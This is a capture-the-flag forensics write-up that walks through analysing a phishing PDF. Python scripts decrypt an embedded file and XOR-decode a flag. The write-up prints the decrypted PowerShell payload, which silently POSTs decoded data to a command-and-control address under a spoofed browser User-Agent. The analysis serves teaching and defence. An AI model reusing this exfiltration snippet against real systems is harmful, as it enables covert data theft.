Context:
CSCBE competition, 2026

Team:
Thibe Hanssens (solo)


Name:
Is This a Rainbow

Category:
Forensics

Hints, info:
Medium
Our SOC team intercepted a phishing email with a PDF attachment and one of our users clicked on it. We need to analyze the PDF and figure out what the attacker was trying to do. Can you help us out?

A file: challenge.pdf
File to be found: download.jpg


Prerequisites:
- pycryptodome
    -> pip install pycryptodome

Write-up:
1. Open pdf in HxD

2. Filter for strings with "csc"
    (It's a JavaScipt object, but you'll find it by searching for strings)
        Find this: https://s3.eu-west-1.amazonaws.com/be.cscbe.challenges.2025/007aafd6-e5f5-40d7-b80c-e670f5749642/download.jpg
    And right below:
        Decode k: Lo6IKXqql3sGC3UzMwRqsQ==
        Decode v: bNUoKPHvFCX2dLxAEGZoPw==
        b64d(s)

3. Using the information from step 2, we can write the script below:

```
import base64
from Crypto.Cipher import AES

k_b64 = 'Lo6IKXqql3sGC3UzMwRqsQ=='
v_b64 = 'bNUoKPHvFCX2dLxAEGZoPw=='
input_file = 'download.jpg'
output_file = 'decrypted_raw.bin'

def decrypt_raw():
    key = base64.b64decode(k_b64)
    iv = base64.b64decode(v_b64)

    with open(input_file, 'rb') as f:
        encrypted_data = f.read()

    # Try CBC mode without unpadding to see the raw output
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)

    with open(output_file, 'wb') as f:
        f.write(decrypted_data)
    
    print(f"[+] Raw decryption saved to {output_file}")
    print(f"[*] First 16 bytes of result: {decrypted_data[:16].hex()}")

if __name__ == "__main__":
    decrypt_raw()
´´´

4. Now cat the result from this script, and look at the first lines:

└─$ cat decrypted_raw.bin  
$ErrorActionPreference = 'SilentlyContinue'
$d = [Convert]::FromBase64String('FgYWLhQ7MmY2JywlIWRlOwpkBgoVIjAmZThmKA==')
$k = 85
$r = -join ($d | ForEach-Object { [char]($_ -bxor $k) })
$h = @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
$c2 = 'http://203.0.113.42:8443/update'
try {
  Invoke-WebRequest -Uri $c2 -Method POST -Body $r -Headers $h -UseBasicParsing | Out-Null
} catch {}
���u)��V{�8(Q��tT����:Ӏ9�T�
                           8N �x�%䶦o��-�����r{�t���V��zv�3IN�]Ipg��+>�
                                                                       )
Everything after here within that file is useless.


5. Now, use the tips received from the first lines, and run this script:

```
import base64

# The base64 string from the PowerShell script
encoded_str = 'FgYWLhQ7MmY2JywlIWRlOwpkBgoVIjAmZThmKA=='
k = 85

# Decode base64 to bytes
data = base64.b64decode(encoded_str)

# Perform the XOR operation
decoded_chars = [chr(b ^ k) for b in data]
result = "".join(decoded_chars)

print(f"Decoded Key/Flag: {result}")
´´´

6. The output shows the key.